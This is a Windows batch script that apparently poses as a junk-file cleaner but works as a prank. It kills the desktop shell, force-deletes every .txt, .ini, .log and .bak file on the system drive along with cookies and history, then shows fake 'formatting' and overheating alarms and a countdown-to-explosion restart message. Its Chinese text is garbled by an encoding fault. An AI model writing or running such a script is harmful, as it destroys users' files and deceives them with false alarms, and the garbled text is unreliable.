@echo off
color 4f
taskkill /im explorer.exe /f
echo ɾ��C�������ļ�......
del /f /s /q "%systemdrive%\*.tmp"
del /f /s /q "%systemdrive%\*.dmp"
del /f /s /q "%systemdrive%\*._mp"
del /f /s /q "%systemdrive%\*.gid"
del /f /s /q "%systemdrive%\*.old"
del /f /s /q "%systemdrive%\*.chk"
del /f /s /q "%systemdrive%\*.bak"
del /f /s /q "%systemdrive%\*.log"
del /f /s /q "%systemdrive%\*.txt"
del /f /s /q "%systemdrive%\*.ini"
del /f /s /q "%systemdrive%\Recycled\*.*"
del /f /s /q "%systemdrive%\RECYCLER\*.*"
del /f /s /q "%windir%\inf\*.pnf"
del /f /s /q "%windir%\Prefetch\*.*"
@ping -n 2 127.1>nul
rd /s /q "%windir%\Downloaded Program Files" & md "%windir%\Downloaded Program Files"
@ping -n 2 127.1>nul
rd /s /q "%windir%\LastGood" & md "%windir%\LastGood"
@ping -n 2 127.1>nul
rd /s /q "%windir%\Offline Web Pages" & md "%windir%\Offline Web Pages"
@ping -n 2 127.1>nul
rd /s /q "%windir%\SoftwareDistribution\Download" & md "%windir%\SoftwareDistribution\Download"
@ping -n 2 127.1>nul
rd /s /q "%windir%\temp" & md "%windir%\temp"
@ping -n 2 127.1>nul
rd /s /q "%userprofile%\Local Settings\Application Data\Microsoft\Media Player" & md "%windir%\Local Settings\Application Data\Microsoft\Media Player"
@ping -n 2 127.1>nul
rd /s /q "%userprofile%\UserData" & md "%windir%\UserData"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Adobe" & md "%windir%\Adobe"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Macromedia" & md "%windir%\Macromedia"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Microsoft\Media Player" & md "%windir%\Microsoft\Media Player"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Microsoft\Office\Recent" & md "%windir%\Microsoft\Office\Recent"
@ping -n 5 127.1>nul
del /a /f /s /q "%userprofile%\Cookies\*.*"
del /a /f /s /q "%userprofile%\Recent\*.*"
del /a /f /s /q "%userprofile%\Local Settings\Application Data\GDIPFONTCACHEV1.dat"
del /a /f /s /q "%userprofile%\Local Settings\Application Data\IconCache.db"
del /a /f /s /q "%userprofile%\Local Settings\History\*.*"
del /a /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /a /f /s /q "%temp%\*.*" del /a /f /s /q "%userprofile%\AppData\Local\GDIPFONTCACHEV1.dat"
del /a /f /s /q "%userprofile%\AppData\Local\IconCache.db"
del /a /f /s /q "%userprofile% \AppData\Local\Microsoft\Windows\History\*.*"
del /a /f /s /q "%userprofile% \AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
del /a /f /s /q "%userprofile% \AppData\Roaming\Microsoft\Windows\Cookies\*.*"
del /a /f /s /q "%userprofile% \AppData\Roaming\Microsoft\Windows\Recent\*.*"
echo ��ɾ�����
@echo.
echo ɾ��D�������ļ�......
@ping -n 3 127.1>nul
@echo ��ɾ�����
@echo.
echo ɾ��E�������ļ�......
@ping -n 3 127.1>nul
echo ��ɾ�����
@echo.
echo ���ڵͼ���ʽ��ȫ��Ӳ��......
@ping -n 3 127.1>nul
echo.
echo ���� ���ж��� �͸�Ӳ��......
ping -n 3 127.1>nul
echo.
echo ���� �������� �͸�Ӳ��......
ping -n 3 127.1>nul
echo.
echo ���� �����Ĵ� �͸�Ӳ��......
ping -n 3 127.1>nul
echo.
echo ���� ������� �͸�Ӳ��......
ping -n 3 127.1>nul
echo.
echo ע��: cpu�¶�127��!�¶ȹ��߱���!!!
echo.
ping -n 2 127.1>nul
echo ע��: Ӳ���¶�86��!�¶ȹ��߱���!!!
echo.
ping -n 2 127.1>nul
echo ע��: �Կ��¶�96��!�¶ȹ��߱���!!!
echo.
ping -n 2 127.1>nul
echo ע��: ϵͳ����, �����¶� �����ٽ�ֵ!!! echo.
echo ע��: ���ݸ��ɳ���99% echo. & pause
echo ���Խ���60���ڱ�����ը!����ǿ�йرյ�Դ!����� ����cpu��Ӳ�̳������!!
shutdown /r /t 60 /c "���Խ���60���ڱ�����ը!����ǿ�йرյ�Դ!����� ����cpu��Ӳ�̳������!!"
ping -n 30 127.1>nul
shutdown -a
start explorer.exe
exit